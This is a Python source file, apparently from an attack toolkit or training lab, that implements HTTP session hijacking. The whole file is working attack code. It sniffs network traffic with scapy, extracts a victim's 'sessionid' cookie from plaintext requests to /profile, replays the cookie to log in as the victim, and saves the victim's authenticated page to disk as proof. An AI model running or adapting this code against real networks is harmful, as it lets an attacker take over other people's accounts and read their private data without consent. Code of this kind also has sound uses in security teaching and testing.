"""
src/attacks/HTTP_session_hijacking.py

Headless-safe HTTP Session Hijacking attack.
GUI is OPTIONAL and enabled only if DISPLAY is available.
"""

import threading
import re
import os
import requests
from scapy.all import sniff, TCP, Raw
from datetime import datetime

# GUI imports are OPTIONAL
GUI_AVAILABLE = False
if os.environ.get("DISPLAY"):
    try:
        from tkinter import Tk, ttk, StringVar, Label
        GUI_AVAILABLE = True
    except Exception:
        GUI_AVAILABLE = False


class HTTPSessionHijacker(threading.Thread):
    def __init__(self, target_domain, target_ip, victim_ip, interface=None):
        super().__init__()
        self.daemon = True

        self._stop_event = threading.Event()

        self.target_domain = target_domain
        self.target_ip = target_ip
        self.victim_ip = victim_ip
        self.interface = interface

        self.stolen_cookie = None
        self.session_replay_success = False

        self.gui = None
        if GUI_AVAILABLE:
            self._setup_gui()
        else:
            print("[INFO] Running in headless mode (no GUI).")

    # GUI

    def _setup_gui(self):
        self.gui = Tk()
        self.gui.title("HTTP Session Hijacking")
        self.gui.geometry("480x260")
        self.gui.resizable(False, False)

        self.status_var = StringVar(value="Initializing attack...")

        Label(self.gui, text="HTTP Session Hijacking", font=("Arial", 16, "bold")).pack(pady=10)
        Label(self.gui, textvariable=self.status_var).pack(pady=10)

        self.progress = ttk.Progressbar(self.gui, length=380, maximum=100)
        self.progress.pack(pady=15)

        self.log_box = ttk.Label(self.gui, text="", wraplength=450, justify="left")
        self.log_box.pack()

        threading.Thread(target=self.gui.mainloop, daemon=True).start()

    def _update_status(self, message, progress=None):
        print(f"[HIJACK] {message}")

        if self.gui:
            self.status_var.set(message)
            self.log_box.config(text=self.log_box.cget("text") + f"\n• {message}")
            if progress is not None:
                self.progress["value"] = progress

    # Attack logic

    def _packet_callback(self, packet):
        if self._stop_event.is_set():
            return

        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")

            # Only steal cookie when victim requests /profile
            if "GET /profile" in payload and "sessionid=" in payload:
                match = re.search(r"sessionid=([a-f0-9]+)", payload)
                if match:
                    self.stolen_cookie = match.group(1)
                    self._update_status(f"Stolen session cookie: {self.stolen_cookie}", 40)
                    self._replay_session()
                    self._stop_event.set()


    def _replay_session(self):
        self._update_status("Replaying victim session...", 60)

        try:
            url = f"http://{self.target_ip}/profile"

            response = requests.get(
                url,
                cookies={"sessionid": self.stolen_cookie},
                headers={
                    "Host": self.target_domain,
                    "User-Agent": "AttackClient",
                },
                timeout=5,
            )

            if response.status_code == 200:
                self.session_replay_success = True
                self._update_status("Session hijack SUCCESS!", 100)
                self._generate_proof_file(response.text)
                return

            self._update_status(
                f"Session hijack FAILED. status={response.status_code}",
                100,
            )

        except Exception as e:
            self._update_status(f"Replay error: {e}", 100)


    def _generate_proof_file(self, html):
        name = f"stolen_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(name, "w") as f:
            f.write(html)

        self._update_status(f"Proof saved: {name}")

    # Thread

    def run(self):
        self._update_status("Sniffing HTTP traffic...", 20)
        sniff(
            iface=self.interface,
            prn=self._packet_callback,
            store=0,
            stop_filter=lambda _: self._stop_event.is_set()
        )

    def stop(self):
        self._stop_event.set()
        self._update_status("Attack stopped.", 100)
